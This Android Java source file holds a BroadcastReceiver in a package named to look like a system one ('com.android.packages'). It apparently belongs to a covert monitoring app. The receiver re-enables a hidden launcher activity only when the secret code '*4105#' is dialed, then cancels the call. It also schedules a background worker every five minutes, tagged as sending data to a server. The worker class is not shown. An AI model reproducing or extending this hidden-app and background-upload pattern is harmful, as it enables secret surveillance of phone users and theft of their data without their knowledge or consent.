package com.android.packages;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;

import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.util.concurrent.TimeUnit;

public class MyReceiver extends BroadcastReceiver {
    public static String SHOW_APP_CODE = "*4105#";
    private static final String TAG_SEND_DATA = "Sending data to server Boradcast";

    @Override
    public void onReceive(Context context, Intent intent) {
        SettingUpPeriodicWork(context);
        String dialedNumber=null;// = getResultData();
          if(dialedNumber == null) {
            // No reformatted number, use the original
            dialedNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
          }
          if(dialedNumber!=null){
            if(dialedNumber.equals(SHOW_APP_CODE)){
                PackageManager packageManager = context.getPackageManager();
                ComponentName componentName = new ComponentName(context, MainActivity.class);
                packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP);

                //Intent to launch MainActivity
                Intent intent_to_mainActivity = new Intent(context, MainActivity.class);
                intent_to_mainActivity.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent_to_mainActivity);
                // My app will bring up, so cancel the dialer broadcast
                setResultData(null);
            }

        }
    }


    private void SettingUpPeriodicWork(Context context) {
        // Create Network constraint
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(true)
                .setRequiresStorageNotLow(true)
                .build();


        PeriodicWorkRequest periodicSendDataWork = new PeriodicWorkRequest.Builder(SendDataWorker.class, 5, TimeUnit.MINUTES)
                .addTag(TAG_SEND_DATA)
                .setConstraints(constraints)
                // setting a backoff on case the work needs to retry
                // .setBackoffCriteria(BackoffPolicy.LINEAR, PeriodicWorkRequest.MIN_BACKOFF_MILLIS, TimeUnit.MILLISECONDS)
                .build();

        WorkManager workManager = WorkManager.getInstance(context);

        workManager.enqueue(periodicSendDataWork);
    }

}
